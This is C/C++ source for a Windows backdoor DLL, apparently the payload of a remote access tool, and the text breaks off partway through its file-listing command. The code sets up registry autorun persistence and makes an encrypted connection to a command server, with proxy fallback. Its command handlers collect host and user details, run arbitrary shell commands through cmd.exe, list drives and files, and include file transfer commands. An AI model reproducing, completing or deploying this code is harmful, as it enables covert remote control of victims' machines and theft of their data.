#include "stdafx.h"

#pragma comment(linker, "/ENTRY:DllMain")

#pragma section(".conf", read, write)

// PE image section with information for infector
__declspec(allocate(".conf")) PAYLOAD_CONFIG m_PayloadConfig =
{
    // address
    "",

    // port
    0,

    // certificate with server public key
    ""
};

// for GetMachineSpecificData()
#define MACHINE_GUID_KEY "SOFTWARE\\Microsoft\\Cryptography"
#define MACHINE_GUID_VAL "MachineGuid"

PAYLOAD_COMMAND m_PayloadCommands[] = {

    { "id", CommandId },
    { "info", CommandInfo },
    { "ping", CommandPing },
    { "exit", CommandExit },
    { "upd", CommandUpd },
    { "uninst", CommandUninst },
    { "exec", CommandExec },
    { "shell", CommandShell }, 
    { "flist", CommandFileList },
    { "fget", CommandFileGet },
    { "fput", CommandFilePut },
    { NULL, NULL }

};

static OSVERSIONINFO m_OsVersion;
static char m_szPath[MAX_PATH], m_szIdent[MD5_SUM_SIZE_STR];
static HANDLE m_hMutex = NULL;
static DWORD m_dwStartTime = 0;

static PCCERT_CONTEXT m_CertContext = NULL;
static RC4_CTX m_CtxSend, m_CtxRecv;
static BOOL m_bRemoteCrypt = FALSE;
//--------------------------------------------------------------------------------------
BOOL AutorunRemove(void)
{
    BOOL bRet = FALSE;
    LONG Code = 0;
    HKEY hKey, hKeyPayload;

    char *lpszCommandLine = GetCommandLine();
    if (lpszCommandLine == NULL)
    {
        return FALSE;
    }

    // open WoW64 autorun key (is any)
    if ((Code = RegOpenKeyEx(
        HKEY_CURRENT_USER, 
        AUTORUN_KEY_PATH, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey)) != ERROR_SUCCESS)
    {
        // open the regular key
        if ((Code = RegOpenKey(HKEY_CURRENT_USER, AUTORUN_KEY_PATH, &hKey)) != ERROR_SUCCESS)
        {
            DbgMsg("RegOpenKey() ERROR %d\n", Code);
            return FALSE;
        }
    }

    // allocate enough of space for the value data
    char *lpszValue = (char *)M_ALLOC(PAGE_SIZE);
    if (lpszValue)
    {
        char szValueName[MAX_PATH];
        DWORD dwNameSize = sizeof(szValueName), dwDataSize = PAGE_SIZE;
        DWORD dwIndex = 0, dwType = 0;

        // enumerate autorun entries
        while (RegEnumValue(
            hKey, dwIndex, szValueName, &dwNameSize, NULL, 
            &dwType, (PBYTE)lpszValue, &dwDataSize) == ERROR_SUCCESS)
        {
            // check for the payload autorun key
            if (dwType == REG_SZ && !lstrcmp(lpszValue, lpszCommandLine))
            {
                // delete aurorun entry
                if (RegDeleteValue(hKey, szValueName) == ERROR_SUCCESS)
                {
                    DbgMsg(__FUNCTION__"(): Autorun entry removed\n");
                    bRet = TRUE;
                }

                // open WoW64 key (is any)
                if ((Code = RegOpenKeyEx(
                    HKEY_CURRENT_USER, 
                    PAYLOAD_KEY_PATH, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKeyPayload)) != ERROR_SUCCESS)
                {
                    // open the regular key
                    Code = RegOpenKey(HKEY_CURRENT_USER, PAYLOAD_KEY_PATH, &hKeyPayload);
                }

                if (Code == ERROR_SUCCESS)
                {
                    // delete payload body
                    if (RegDeleteValue(hKeyPayload, szValueName) == ERROR_SUCCESS)
                    {
                        DbgMsg(__FUNCTION__"(): Payload data removed\n");
                    }

                    RegCloseKey(hKeyPayload);
                }
                else
                {
                    DbgMsg("RegOpenKey() ERROR %d\n", Code);
                }
            }

            dwNameSize = sizeof(szValueName);
            dwDataSize = PAGE_SIZE;

            // go to the next value
            dwIndex += 1;
        }

        M_FREE(lpszValue);
    }

    RegCloseKey(hKey);

    return bRet;
}
//--------------------------------------------------------------------------------------
DWORD ResolveHostname(char *lpszHostname)
{
    DWORD Ret = 0;

    // try to resolve hostname first
    struct hostent *NameInfo = gethostbyname(lpszHostname);
    if (NameInfo == NULL)
    {
        // check for IPv4 address
        if ((Ret = (DWORD)inet_addr(lpszHostname)) != INADDR_NONE)
        {
            return Ret;
        }

        DbgMsg(__FUNCTION__"() ERROR: Unable to resolve \"%s\"\n", lpszHostname);

        return INADDR_NONE;
    }

    // cpy an IP address
    memcpy((void *)&Ret, NameInfo->h_addr, min(NameInfo->h_length, sizeof(DWORD)));

    return Ret;
}
//--------------------------------------------------------------------------------------
void RemoteCrypt(RC4_CTX *Ctx, char *lpszBuff, int BuffSize)
{
    if (m_bRemoteCrypt)
    {
        arc4_crypt(Ctx, (PUCHAR)lpszBuff, BuffSize);
    }
}
//--------------------------------------------------------------------------------------
BOOL RemoteRecvData(SOCKET s, char *lpszBuff, int BuffSize)
{
    int p = 0;

    while (p < BuffSize)
    {
        int ret = recv(s, lpszBuff + p, BuffSize - p, 0);
        if (ret == SOCKET_ERROR || ret == 0)
        {
            DbgMsg("recv() ERROR %d\n", WSAGetLastError());
            return FALSE;
        }

        p += ret;
    }

    RemoteCrypt(&m_CtxRecv, lpszBuff, BuffSize);

    return TRUE;
}

BOOL RemoteRecv(SOCKET s, char *lpszBuff, int BuffSize)
{
    int p = 0;

    ZeroMemory(lpszBuff, BuffSize);

    while (p < BuffSize)
    {
        int ret = recv(s, lpszBuff + p, BuffSize - p, 0);
        if (ret == SOCKET_ERROR || ret == 0)
        {
            DbgMsg("recv() ERROR %d\n", WSAGetLastError());
            return FALSE;
        }

        RemoteCrypt(&m_CtxRecv, lpszBuff + p, ret);

        for (int i = 0; i < ret; i += 1)
        {
            if (lpszBuff[p + i] == '\0')
            {
                return TRUE;
            }
        }

        p += ret;
    }

    DbgMsg(__FUNCTION__ "() ERROR: Too much data\n");

    return FALSE;
}

BOOL RemoteRecv(SOCKET s, PWSTR lpszBuff, int BuffSize)
{
    BOOL bRet = FALSE;

    ZeroMemory(lpszBuff, BuffSize * sizeof(WCHAR));

    char *lpszTemp = (char *)M_ALLOC(BuffSize);
    if (lpszTemp)
    {
        if (bRet = RemoteRecv(s, lpszTemp, BuffSize))
        {
            // convert data from UTF-8 to UTF-16
            MultiByteToWideChar(CP_UTF8, 0, lpszTemp, -1, lpszBuff, BuffSize);
        }

        M_FREE(lpszTemp);
    }
    else
    {
        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
typedef int(__cdecl * func_sprintf)(LPSTR, LPCSTR, ...);
typedef int(__cdecl * func_vsprintf)(LPSTR, LPCSTR, va_list arglist);
typedef int(__cdecl * func__vscprintf)(const char *format, va_list argptr);

static func_sprintf f_sprintf = NULL;
static func_vsprintf f_vsprintf = NULL;
static func__vscprintf f__vscprintf = NULL;

BOOL RemoteSendData(SOCKET s, char *lpszBuff, int BuffSize)
{
    int p = 0;

    RemoteCrypt(&m_CtxSend, lpszBuff, BuffSize);

    while (p < BuffSize)
    {
        int ret = send(s, lpszBuff + p, BuffSize - p, 0);
        if (ret == SOCKET_ERROR || ret == 0)
        {
            DbgMsg("send() ERROR %d\n", WSAGetLastError());
            return FALSE;
        }

        p += ret;
    }

    return TRUE;
}

BOOL RemoteSendData(SOCKET s, char *lpszBuff)
{
    return RemoteSendData(s, lpszBuff, lstrlen(lpszBuff));
}

BOOL RemoteSendData(SOCKET s, PWSTR lpszBuff)
{
    BOOL bRet = FALSE;

    // query string length
    int DataLen = WideCharToMultiByte(CP_UTF8, 0, lpszBuff, -1, NULL, 0, NULL, NULL);
    if (DataLen > 0)
    {
        char *lpszData = (char *)M_ALLOC(DataLen);
        if (lpszData)
        {
            // do the conversion from UTF-16 to UTF-8
            WideCharToMultiByte(CP_UTF8, 0, lpszBuff, -1, lpszData, DataLen, NULL, NULL);

            if (lpszData[DataLen - 1] == 0)
            {
                // exclude zero termination character
                DataLen -= 1;
            }

            bRet = RemoteSendData(s, lpszData, DataLen);            

            M_FREE(lpszData);
        }
        else
        {
            DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
        }
    }

    return bRet;
}

BOOL RemoteSend(SOCKET s, char *lpszMsg, ...)
{
    BOOL bRet = FALSE;

    if (f_sprintf == NULL || f_vsprintf == NULL || f__vscprintf == NULL)
    {
        HMODULE hCrt = LoadLibraryA("msvcrt.dll");
        if (hCrt == NULL)
        {
            return FALSE;
        }

        if ((f_sprintf = (func_sprintf)GetProcAddress(hCrt, "sprintf")) == NULL)
        {
            return FALSE;
        }

        if ((f_vsprintf = (func_vsprintf)GetProcAddress(hCrt, "vsprintf")) == NULL)
        {
            return FALSE;
        }

        if ((f__vscprintf = (func__vscprintf)GetProcAddress(hCrt, "_vscprintf")) == NULL)
        {
            return FALSE;
        }
    }

    va_list mylist;
    va_start(mylist, lpszMsg);

    int len = f__vscprintf(lpszMsg, mylist);

    char *lpszBuff = (char *)M_ALLOC(len + 1);
    if (lpszBuff == NULL)
    {
        va_end(mylist);
        return FALSE;
    }

    f_vsprintf(lpszBuff, lpszMsg, mylist);
    va_end(mylist);

    bRet = RemoteSendData(s, lpszBuff);

    M_FREE(lpszBuff);
    
    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL RemoteAuth(SOCKET s)
{
    REQUEST_AUTH Request;
    DWORD dwDigestLen = CERTIFICATE_DIGEST_SIZE;

    ZeroMemory(&Request, sizeof(Request));
    Request.dwVersion = REMOTE_VERSION;    

    // get SHA1 digest of the server ceritifcate
    if (!CryptHashCertificate(0, CALG_SHA1, 0,
        m_CertContext->pbCertEncoded, m_CertContext->cbCertEncoded,
        Request.Digest, &dwDigestLen))
    {
        DbgMsg("CryptHashCertificate() ERROR 0x%.8x\n", GetLastError());
        return FALSE;
    }

    // generate random session key using windows crypto API
    if (!CryptRandomBytes(Request.Key, CLIENT_SESSION_KEY_SIZE))
    {
        return FALSE;
    }

    DWORD dwDataSize = CryptRSAPublicKeyInfo(m_CertContext);
    if (dwDataSize == 0)
    {
        return FALSE;
    }

    PUCHAR Encrypted = (PUCHAR)M_ALLOC(dwDataSize);
    if (Encrypted == NULL)
    {
        DbgMsg("M_ALLOC() ERROR 0x%.8x\n", GetLastError());
        return FALSE;
    }
        
    ZeroMemory(Encrypted, dwDataSize);
    memcpy(Encrypted, &Request, sizeof(Request));

    BOOL bSuccess = FALSE;

    // encrypt PKCS#1 v1.5 encoded auth request with server public key
    if (CryptRSAEncrypt(m_CertContext, Encrypted, sizeof(Request), dwDataSize))
    {
        // send auth request to the server
        bSuccess = RemoteSendData(s, (char *)Encrypted, dwDataSize);
    }

    M_FREE(Encrypted);

    if (!bSuccess)
    {
        return FALSE;
    }

    UCHAR KeyHash[MD5_SUM_SIZE];

    // calculate MD5 hash of session key
    if (!CryptMD5Digest((PVOID)&Request.Key, CLIENT_SESSION_KEY_SIZE, KeyHash))
    {
        return FALSE;
    }
    
    UCHAR Data[MD5_SUM_SIZE];

    // receive server reply
    if (!RemoteRecvData(s, (char *)&Data, sizeof(Data)))
    {
        return FALSE;
    }

    if (memcmp(KeyHash, Data, MD5_SUM_SIZE) != 0)
    {
        DbgMsg(__FUNCTION__"() ERROR: Authentication fails\n");
        return FALSE;
    }    

    arc4_set_key(&m_CtxRecv, Request.Key, CLIENT_SESSION_KEY_SIZE);
    arc4_set_key(&m_CtxSend, Request.Key, CLIENT_SESSION_KEY_SIZE);

    m_bRemoteCrypt = TRUE;

    return TRUE;
}
//--------------------------------------------------------------------------------------
SOCKET RemoteConnectProxy(DWORD Address, WORD Port)
{
    BOOL bRet = FALSE;

    ProxySet(NULL);

    // get list of available proxy servers from system settings
    CLIENT_PROXY_INFO ProxyInfo;
    ProxyInfoGet(&ProxyInfo);

    if (ProxyInfo.ServersCount == 0)
    {
        DbgMsg(__FUNCTION__"(): No proxy servers found\n");
        return INVALID_SOCKET;
    }

    for (DWORD i = 0; i < ProxyInfo.ServersCount; i += 1)
    {
        PCLIENT_PROXY pServer = &ProxyInfo.Servers[i];

        DbgMsg(
            __FUNCTION__"(): Trying to connect using proxy server %s:%d\n",
            pServer->szAddress, pServer->Port
        );

        // check each server for availability
        SOCKET s = ProxyConnect(pServer, Address, Port);
        if (s != INVALID_SOCKET)
        {
            // authenticate client
            if (RemoteAuth(s))
            {
                DbgMsg(__FUNCTION__"(): Connected!\n");

                ProxySet(pServer);

                return s;
            }

            closesocket(s);
        }
    }

    return INVALID_SOCKET;
}
//--------------------------------------------------------------------------------------
SOCKET RemoteConnect(DWORD Address, WORD Port)
{
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(Port);
    addr.sin_addr.s_addr = Address;

    m_bRemoteCrypt = FALSE;

    DbgMsg(__FUNCTION__"(): Connecting to %s:%d...\n", inet_ntoa(addr.sin_addr), Port);

    SOCKET s = RemoteConnectProxy(Address, Port);
    if (s != INVALID_SOCKET)
    {
        return s;
    }    

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET)
    {        
        if (connect(s, (sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
        {
            // authenticate client
            if (RemoteAuth(s))
            {
                DbgMsg(__FUNCTION__"(): Connected!\n");

                return s;
            }
        }
        else
        {
            DbgMsg("connect() ERROR %d\n", WSAGetLastError());
        }

        closesocket(s);
    }
    else
    {
        DbgMsg("socket() ERROR %d\n", WSAGetLastError());
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
DWORD RemoteCommunicate(SOCKET s)
{
    char *lpszBuff = (char *)M_ALLOC(REMOTE_MAX_CMD_SIZE);
    if (lpszBuff == NULL)
    {
        return CMD_RESET;
    }

    while (true)
    {
        int p = 0;
        char *lpszCommand = lpszBuff, *lpszArgs = NULL;

        ZeroMemory(lpszBuff, REMOTE_MAX_CMD_SIZE);

        // receive command
        while (true)
        {
            BOOL bRecv = FALSE;

            if (p == 0)
            {
                fd_set fds_read;
                TIMEVAL tv;

                tv.tv_sec = REMOTE_PING_TIME;
                tv.tv_usec = 0;

                FD_ZERO(&fds_read);
                FD_SET(s, &fds_read);

                int Ret = select(0, &fds_read, NULL, NULL, &tv);
                if (Ret == SOCKET_ERROR)
                {
                    DbgMsg("select() ERROR %d\n", WSAGetLastError());
                    goto _end;
                }
                else if (Ret > 0)
                {
                    if (FD_ISSET(s, &fds_read))
                    {
                        // there's some data to read
                        bRecv = TRUE;
                    }
                }
                else if (Ret == 0)
                {
                    // timeout occured
                    CommandPing(s, NULL);
                }
            }
            else
            {
                bRecv = TRUE;
            }

            if (!bRecv)
            {
                continue;
            }

            int len = recv(s, lpszBuff + p, REMOTE_MAX_CMD_SIZE - p, 0);
            if (len == SOCKET_ERROR)
            {
                DbgMsg("recv() ERROR %d\n", WSAGetLastError());
                goto _end;
            }

            if (len == 0)
            {
                DbgMsg(__FUNCTION__"(): Connection closed\n");
                goto _end;
            }

            RemoteCrypt(&m_CtxRecv, lpszBuff + p, len);
            p += len;

            if (p >= REMOTE_MAX_CMD_SIZE)
            {
                DbgMsg(__FUNCTION__"() ERROR: Command is too long\n");
                goto _end;
            }

            if (lpszBuff[p - 1] == '\n')
            {
                lpszBuff[p - 1] = '\0';
                p -= 1;

                if (lpszBuff[p - 1] == '\r')
                {
                    lpszBuff[p - 1] = '\0';
                    p -= 1;
                }

                break;
            }
        }        

        // parse command
        for (p = 0; p < lstrlen(lpszBuff); p += 1)
        {
            if (lpszBuff[p] == ' ')
            {               
                if (str_item_count(lpszBuff, ' ') > 1)
                {
                    lpszArgs = lpszBuff + p + 1;
                }                

                lpszBuff[p] = '\0';
               
                break;
            }
        }

        DbgMsg(__FUNCTION__"(): Command = \"%s\"\n", lpszCommand);

        BOOL bHandled = FALSE;
        DWORD dwRet = CMD_OK;

        // dispatch command
        for (p = 0; m_PayloadCommands[p].lpszCommand != NULL; p += 1)
        {
            if (!lstrcmp(m_PayloadCommands[p].lpszCommand, lpszCommand))
            {
                dwRet = m_PayloadCommands[p].Handler(s, lpszArgs);
                bHandled = TRUE;

                break;
            }
        }

        if (!bHandled)
        {
            DbgMsg(__FUNCTION__"() ERROR: Unknown command\n");
            
            if (!RemoteSend(s, "ERROR: Unknown command\n"))
            {
                dwRet = CMD_RESET;
            }
        }
        
        if (dwRet != CMD_OK)
        {
            return dwRet;
        }        
    }

_end:

    return CMD_RESET;
}
//--------------------------------------------------------------------------------------
DWORD CommandId(SOCKET s, char *lpszArgs)
{
    DbgMsg(__FUNCTION__"()\n");

    // send client ID
    if (!RemoteSend(s, "%s\n", m_szIdent))
    {
        return CMD_RESET;
    }

    return CMD_OK;
}
//--------------------------------------------------------------------------------------
DWORD CommandInfo(SOCKET s, char *lpszArgs)
{
    DWORD dwRet = CMD_RESET;

    DbgMsg(__FUNCTION__"()\n");

    WCHAR szComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD dwComputerNameLen = MAX_COMPUTERNAME_LENGTH + 1;
    ZeroMemory(szComputerName, sizeof(szComputerName));

    if (!GetComputerNameW(szComputerName, &dwComputerNameLen))
    {
        DbgMsg("GetComputerName() ERROR %d\n", GetLastError());
    }

    WCHAR szUserName[MAX_PATH];
    DWORD dwUserNameLen = MAX_PATH;
    ZeroMemory(szUserName, sizeof(szUserName));

    if (!GetUserNameW(szUserName, &dwUserNameLen))
    {
        DbgMsg("GetUserName() ERROR %d\n", GetLastError());
    }

    WCHAR szPath[MAX_PATH];
    ZeroMemory(szPath, sizeof(szPath));

    GetModuleFileNameW(GetModuleHandle(NULL), szPath, MAX_PATH);

    PWSTR lpszBuff = (PWSTR)M_ALLOC(PAGE_SIZE);
    if (lpszBuff)
    {
        wsprintfW(
            lpszBuff, L"%s|%s|%d|%s|%d|%d\n", 
            szComputerName, szUserName, GetCurrentProcessId(), szPath, 
            CheckForAdminUser() ? 1 : 0, GetProcessIntegrity()
        );

        // send client information string
        if (RemoteSendData(s, lpszBuff))
        {
            dwRet = CMD_OK;
        }

        M_FREE(lpszBuff);
    }

    return dwRet;
}
//--------------------------------------------------------------------------------------
DWORD CommandPing(SOCKET s, char *lpszArgs)
{
    DbgMsg(__FUNCTION__"()\n");

    if (!RemoteSend(s, "{{{$%.8x}}}\n", GetTickCount() - m_dwStartTime))
    {
        return CMD_RESET;
    }

    return CMD_OK;
}
//--------------------------------------------------------------------------------------
DWORD CommandExit(SOCKET s, char *lpszArgs)
{
    DbgMsg(__FUNCTION__"()\n");

    // tell the caller function to quit from the communication loop
    return CMD_EXIT;
}
//--------------------------------------------------------------------------------------
DWORD CommandUpd(SOCKET s, char *lpszArgs)
{
    if (lpszArgs == NULL)
    {
        return CMD_RESET;
    }

    DbgMsg(__FUNCTION__"()\n");

    // remove currently present autorun entry
    AutorunRemove();

    // disconnect from the server
    closesocket(s);

    if (m_hMutex)
    {
        // remove unique client mutex
        CloseHandle(m_hMutex);
        m_hMutex = NULL;
    }

    PROCESS_INFORMATION ProcessInfo;
    ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

    STARTUPINFO StartupInfo;
    GetStartupInfo(&StartupInfo);
    StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    StartupInfo.wShowWindow = FALSE;
    
    // start the new client
    if (CreateProcess(NULL, lpszArgs, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInfo))
    {
        DWORD dwExitCode = -1;

        if (WaitForSingleObject(ProcessInfo.hProcess, UPDATE_TIMEOUT * 1000) == WAIT_TIMEOUT)
        {
            TerminateProcess(ProcessInfo.hProcess, dwExitCode);

            DbgMsg(__FUNCTION__"() ERROR: Wait timeout\n");
            goto _end;
        }

        if (!GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode))
        {
            DbgMsg("GetExitCodeProcess() ERROR %d\n", GetLastError());
            goto _end;
        }        

        DbgMsg(__FUNCTION__"(): Process exit code is 0x%x\n", dwExitCode);
_end:
        CloseHandle(ProcessInfo.hProcess);
        CloseHandle(ProcessInfo.hThread);

        if (dwExitCode == 0)
        {
            return CMD_NO_CLOSE | CMD_EXIT;
        }
    }
    else
    {
        DbgMsg("CreateProcess() ERROR %d\n", GetLastError());
    }

    // create unique client mutex again in case of failure
    if (m_hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME))
    {
        if (GetLastError() == ERROR_ALREADY_EXISTS)
        {
            DbgMsg(__FUNCTION__"(): Already running\n");

            return CMD_NO_CLOSE | CMD_EXIT;
        }
    }

    return CMD_NO_CLOSE | CMD_RESET;
}
//--------------------------------------------------------------------------------------
DWORD CommandUninst(SOCKET s, char *lpszArgs)
{
    DbgMsg(__FUNCTION__"()\n");

    // remove currently present autorun entry
    AutorunRemove();

    // tell the caller function to quit from the communication loop
    return CMD_EXIT;
}
//--------------------------------------------------------------------------------------
DWORD CommandExec(SOCKET s, char *lpszArgs)
{
    DWORD dwRet = CMD_OK;
    PWSTR lpszCmd = NULL, lpszCmdLine = NULL;
    PUCHAR Buff = NULL;

    SECURITY_ATTRIBUTES SecAttr;
    SecAttr.lpSecurityDescriptor = NULL;
    SecAttr.nLength = sizeof(SecAttr);
    SecAttr.bInheritHandle = TRUE;

    DWORD dwExitCode = -1;
    HANDLE hConsoleInput = NULL, hInput = NULL;
    HANDLE hConsoleOutput = NULL, hOutput = NULL;    

    if (lpszArgs == NULL)
    {
        goto _end;
    }

    DbgMsg(__FUNCTION__"()\n");

    // allocate I/O buffer
    if ((Buff = (PUCHAR)M_ALLOC(PAGE_SIZE)) == NULL)
    {
        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }

    // create console input pipe
    if (!CreatePipe(&hConsoleInput, &hInput, &SecAttr, 0))
    {
        DbgMsg("CreatePipe() ERROR %d\n", GetLastError());
        goto _end;
    }

    // create console output pipe
    if (!CreatePipe(&hOutput, &hConsoleOutput, &SecAttr, 0))
    {
        DbgMsg("CreatePipe() ERROR %d\n", GetLastError());
        goto _end;
    }

    PROCESS_INFORMATION ProcessInfo;
    ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

    STARTUPINFOW StartupInfo;
    GetStartupInfoW(&StartupInfo);
    StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    StartupInfo.wShowWindow = FALSE;
    StartupInfo.hStdError = StartupInfo.hStdOutput = hConsoleOutput;
    StartupInfo.hStdInput = hConsoleInput;

    BOOL bUnicode = FALSE;

    if (!((m_OsVersion.dwMajorVersion == 5) ||
          (m_OsVersion.dwMajorVersion == 6 && m_OsVersion.dwMinorVersion == 0)))
    {
        /*
            Switch console code page to UTF-8 on NT 6.1 and higher,
            on older Windows versions its support in cmd.exe is broken.
        */
        bUnicode = TRUE;
    }

    UINT CodePage = bUnicode ? 65001 : 0;  

    // get UTF-16 string length
    int CmdLen = MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, NULL, 0);
    if (CmdLen == 0)
    {
        DbgMsg("MultiByteToWideChar() ERROR %d\n", GetLastError());
        goto _end;
    }

    // calculate an actual amount of needed memory
    DWORD dwCmdSize = (CmdLen + 1) * sizeof(WCHAR);

    // allocate memory for the command to execute
    if ((lpszCmd = (PWSTR)M_ALLOC(dwCmdSize)) == NULL)
    {
        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }

    // convert command string from UTF-8 to UTF-16
    ZeroMemory(lpszCmd, dwCmdSize);
    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszCmd, CmdLen);

    // allocate memory for the process command line
    if ((lpszCmdLine = (PWSTR)M_ALLOC(dwCmdSize + (MAX_PATH * sizeof(WCHAR)))) == NULL)
    {
        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }    

    wsprintfW(lpszCmdLine, L"cmd.exe /C \"%s%s\"", bUnicode ? L"chcp 65001 > NUL & " : L"", lpszCmd);

    // run the command shell process
    if (!CreateProcessW(NULL, lpszCmdLine, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo))
    {
        DbgMsg("CreateProcess() ERROR %d\n", GetLastError());
        goto _end;
    }    
    
    if (CodePage == 0)
    {
        // just for sure
        FreeConsole();

        // allocate new console
        if (AllocConsole())
        {
            // get console code page value
            CodePage = GetConsoleCP();
            FreeConsole();
        }
    }    

    DbgMsg(
        __FUNCTION__"(): Shell process %d started, code page: %d\n", 
        ProcessInfo.dwProcessId, CodePage
    );

    DWORD dwTime = GetTickCount();

    while (true)
    { 
        DWORD dwReaded = 0, dwBytesAvailable = 0;        

        // check if there is any data in the pipe to read
        if (!PeekNamedPipe(hOutput, NULL, NULL, NULL, &dwBytesAvailable, NULL))
        {            
            DbgMsg("PeekNamedPipe() ERROR %d\n", GetLastError());
            break;
        }

        if (dwBytesAvailable == 0) 
        { 
            if (GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode))
            {
                if (dwExitCode != STILL_ACTIVE)
                {
                    break;
                }
            }
            else
            {
                DbgMsg("GetExitCodeProcess() ERROR %d\n", GetLastError());
                break;
            }

            if (GetTickCount() - dwTime >= EXEC_TIMEOUT * 1000)
            {
                DbgMsg(__FUNCTION__"() ERROR: Timeout occured\n");
                RemoteSend(s, "\n *** ERROR: Timeout occured\n");
                break;
            }

            SwitchToThread(); 
            continue; 
        }        

        // read process stdout
        if (!ReadFile(hOutput, Buff, min(PAGE_SIZE, dwBytesAvailable), &dwReaded, NULL))
        {
            DbgMsg("ReadFile() ERROR %d\n", GetLastError());
            break;
        }

        if (dwReaded == 0)
        {
            continue;
        }                    

        if (CodePage != 0)
        {
            int DataLen = MultiByteToWideChar(CodePage, 0, (LPCSTR)Buff, dwReaded, NULL, 0);
            if (DataLen > 0)
            {
                // calculate an actual amount of needed memory
                DWORD dwBuffLen = (DataLen + 1) * sizeof(WCHAR);
                PWSTR lpszBuff = (PWSTR)M_ALLOC(dwBuffLen);
                if (lpszBuff)
                {
                    // convert command soutput from console code page to UTF-16
                    ZeroMemory(lpszBuff, dwBuffLen);
                    MultiByteToWideChar(CodePage, 0, (LPCSTR)Buff, dwReaded, lpszBuff, DataLen);

                    if (!RemoteSendData(s, lpszBuff))
                    {
                        M_FREE(lpszBuff);

                        dwRet = CMD_RESET;
                        break;
                    }                   

                    M_FREE(lpszBuff);
                }
                else
                {
                    DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
                }
            }
            else
            {
                DbgMsg("MultiByteToWideChar() ERROR %d\n", GetLastError());
            }
        }
        else
        {
            // unknown code page, pass raw data
            if (!RemoteSendData(s, (char *)Buff, dwReaded))
            {
                dwRet = CMD_RESET;
                break;
            }
        }

        dwTime = GetTickCount();
    }    

    if (GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode))
    {
        if (dwExitCode == STILL_ACTIVE)
        {
            // terminate command shell process if it's still active
            if (!TerminateProcess(ProcessInfo.hProcess, 0))
            {
                DbgMsg("TerminateProcess() ERROR %d\n", GetLastError());
            }
        }
    }
    else
    {
        DbgMsg("GetExitCodeProcess() ERROR %d\n", GetLastError());
    }

    DbgMsg(__FUNCTION__"(): Shell process %d terminated\n", ProcessInfo.dwProcessId);

_end:

    if (ProcessInfo.hProcess)
    {        
        CloseHandle(ProcessInfo.hProcess);
    }

    if (ProcessInfo.hThread)
    {
        CloseHandle(ProcessInfo.hThread);
    }

    if (hOutput)
    {
        CloseHandle(hOutput);
    }

    if (hConsoleOutput)
    {
        CloseHandle(hConsoleOutput);
    }

    if (hInput)
    {
        CloseHandle(hInput);
    }

    if (hConsoleInput)
    {
        CloseHandle(hConsoleInput);
    }

    if (lpszCmdLine)
    {
        M_FREE(lpszCmdLine);
    }

    if (lpszCmd)
    {
        M_FREE(lpszCmd);
    }

    if (Buff)
    {
        M_FREE(Buff);
    }

    if (!RemoteSend(s, "{{{#%.8x}}}\n", dwExitCode))
    {
        dwRet = CMD_RESET;
    }

    return dwRet;
}
//--------------------------------------------------------------------------------------
DWORD CommandShell(SOCKET s, char *lpszArgs)
{
    DbgMsg(__FUNCTION__"()\n");

    // interactive shell command is not implemented yet

    return CMD_RESET;
}
//--------------------------------------------------------------------------------------
DWORD CommandFileList(SOCKET s, char *lpszArgs)
{
    DWORD dwExitCode = -1, dwRet = CMD_OK;        
    PWSTR lpszPath = NULL;
    WIN32_FIND_DATAW FindData;

    DbgMsg(__FUNCTION__"()\n");

    if (lpszArgs == NULL)
    {        
        char szDrives[MAX_PATH];
        char *lpszDrive = szDrives;

        DbgMsg(__FUNCTION__"()\n");

        // list available volumes
        if (GetLogicalDriveStrings(MAX_PATH, szDrives))
        {
            while (*lpszDrive != NULL)
            {
                int len = lstrlen(lpszDrive);

                if (len > 0 && lpszDrive[len - 1] == '\\')
                {
                    lpszDrive[len - 1] = '\0';
                }

                // hdd drive?
                UINT DriveType = GetDriveType(lpszDrive);
                if (DriveType != DRIVE_UNKNOWN)
                {
                    if (!RemoteSend(s, "D %s\n", lpszDrive))
                    {
                        return CMD_RESET;
                    }
                }

                lpszDrive += len + 1;
            }

            dwExitCode = 0;
        }
        else
        {
            DbgMsg("GetLogicalDriveStrings() ERROR %d\n", GetLastError());
        }
        
        goto _end;
    }    

    // get UTF-16 string length
    int PathLen = MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, NULL, 0);
    if (PathLen == 0)
    {
        DbgMsg("MultiByteToWideChar() ERROR %d\n", GetLastError());
        goto _end;
    }

    // calculate an actual amount of needed memory
    DWORD dwPathSize = (PathLen + 3) * sizeof(WCHAR);

    // allocate memory for file path
    if ((lpszPath = (PWSTR)M_ALLOC(dwPathSize)) == NULL)
    {
        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }

    // convert file path from UTF-8 to UTF-16
    ZeroMemory(lpszPath, dwPathSize);
    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszPath, PathLen);        

    if (lpszPath[PathLen - 1] == L'\\' || lpszPath[PathLen - 1] == L'/')
    {
        // remove ending slash
        lpszPath[PathLen - 1] = L'\0';
    }

    wcscat(lpszPath, L"\\*");

    // open data location
